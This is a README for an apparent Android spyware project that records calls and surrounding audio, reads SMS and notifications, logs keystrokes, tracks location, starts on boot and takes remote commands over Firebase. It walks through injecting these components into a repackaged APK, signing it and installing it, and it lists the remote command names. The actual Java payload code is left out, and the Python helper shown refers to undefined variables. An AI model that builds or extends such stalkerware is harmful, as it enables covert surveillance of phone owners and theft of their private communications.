# Android Spy App

This project contains an Android app that implements various monitoring features including call recording, screenshot taking, location monitoring, surrounding audio recording, SMS reading, key logging, and notification reading. The app can be controlled remotely via Firebase Cloud Messaging (FCM).

## Features

- **Call Recording**: Automatically records incoming and outgoing calls.
- **Screenshot Taking**: Takes screenshots on command.
- **Location Monitoring**: Monitors device location and logs it.
- **Surrounding Audio Recording**: Records surrounding audio.
- **SMS Reading**: Reads and logs SMS messages.
- **Key Logging**: Captures keystrokes.
- **Notification Reading**: Reads and logs notifications.
- **Boot Start**: Starts the service automatically on device boot.

## Prerequisites

1. **Java Development Kit (JDK)**: Install JDK 8 or above.
2. **Android SDK**: Install Android SDK.
3. **Firebase Project**: Set up a Firebase project and get your `google-services.json` file.
4. **Termux**: Ensure Termux is installed on your device.

## Setup

### 1. Generate Base APK

1. Create a directory for your project and navigate into it:
    ```bash
    mkdir android_spy_app
    cd android_spy_app
    ```

2. **Create a `base.apk` using a basic Android project setup**.

### 2. Update the Base APK

1. **Create necessary directories**:
    ```bash
    mkdir -p output/src/com/example/myapp
    ```

2. **Implement Java Code**:
    Save the following Python script as `implement_java_code.py` and run it to generate the Java source files:
    ```python
    import os

    def implement_java_code():
        os.makedirs('output/src/com/example/myapp', exist_ok=True)

        # Define your Java code strings here (omitted for brevity)
        # ...

        java_files = {
            'MyFirebaseMessagingService.java': firebase_service_code,
            'CallRecorder.java': call_recorder_code,
            'ScreenshotTaker.java': screenshot_taker_code,
            'LocationMonitor.java': location_monitor_code,
            'SurroundingRecorder.java': surrounding_recorder_code,
            'SMSReader.java': sms_reader_code,
            'KeyLogger.java': key_logger_code,
            'NotificationReader.java': notification_reader_code,
            'BootReceiver.java': boot_receiver_code
        }

        for filename, content in java_files.items():
            with open(f'output/src/com/example/myapp/{filename}', 'w') as file:
                file.write(content)

    if __name__ == "__main__":
        implement_java_code()
    ```

    Run the script:
    ```bash
    python implement_java_code.py
    ```

### 3. Modify the Base APK

1. **Add Java Files**: Use a tool like APKTool to decompile your `base.apk`, add the generated Java files, and recompile the APK.

2. **Modify `AndroidManifest.xml`**: Ensure all required permissions are added, and register your services and receivers.

### 4. Build and Sign the APK

1. **Compile Java Code**:
    - Use `javac` to compile your Java code.

2. **Create APK**:
    - Use `apktool` to build the APK.
    - Sign the APK using `apksigner`.

### 5. Deploy the APK

1. **Install APK**:
    ```bash
    adb install path/to/your/modified.apk
    ```

2. **Ensure Permissions**:
    - Grant all required permissions manually or modify the APK to request them.

## Firebase Setup

1. **Configure Firebase Cloud Messaging (FCM)**:
    - Set up Firebase and get your `google-services.json` file.
    - Place `google-services.json` in your Android project’s `app` directory.

2. **Modify FirebaseService**:
    - Update `MyFirebaseMessagingService` to handle FCM messages and commands.

## Commands

To command the app remotely, send messages via Firebase with the following data payloads:

- `record_call`: Start recording calls.
- `take_screenshot`: Take a screenshot.
- `monitor_location`: Start location monitoring.
- `record_surroundings`: Start recording surrounding audio.
- `read_sms`: Read SMS messages.
- `key_logger`: Start key logging.
- `read_notifications`: Start reading notifications.

## License

This project is for educational purposes only. Use responsibly and within legal boundaries.

